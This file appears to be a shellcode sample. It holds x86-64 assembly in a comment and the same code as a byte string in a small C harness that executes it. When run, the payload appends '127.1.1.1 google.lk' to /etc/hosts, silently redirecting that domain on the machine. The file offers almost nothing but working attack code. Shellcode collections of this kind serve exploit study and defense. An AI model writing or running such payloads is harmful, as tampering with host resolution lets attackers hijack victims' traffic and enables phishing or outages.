/*
global _start
    section .text
_start:
    ;open
    push 2
    pop rax
    xor rdi, rdi
    push rdi ; 0x00
    mov rbx, 0x7374736f682f2f2f ; ///hosts
    push rbx
    mov rbx, 0x2f2f2f2f6374652f ; /etc////
    push rbx
    push rsp
    pop rdi
    xor rsi,rsi
    mov sil,4
    sal rsi,8
    mov sil,1
    syscall
    ;write
    push rax
    pop rdi
    push 1
    pop rax
    jmp data
write:
    pop rsi
    push len ; length in rdx
    pop rdx
    syscall
    ;close
    push 3
    pop rax
    syscall
    ;exit
    push 60
    pop rax
    xor rdi, rdi
    syscall
data:
    call write
    text db '127.1.1.1 google.lk'
    len equ $-text
*/

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x02\x58\x48\x31\xff\x57\x48\xbb\x2f\x2f\x2f\x68\x6f\x73\x74\x73\x53\x48\xbb\x2f\x65\x74\x63\x2f\x2f\x2f\x2f\x53\x54\x5f\x48\x31\xf6\x40\xb6\x04\x48\xc1\xe6\x08\x40\xb6\x01\x0f\x05\x50\x5f\x6a\x01\x58\xeb\x13\x5e\x6a\x13\x5a\x0f\x05\x6a\x03\x58\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05\xe8\xe8\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x6c\x6b";
void main()
{
	printf("Shellcode Length:  %lu\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}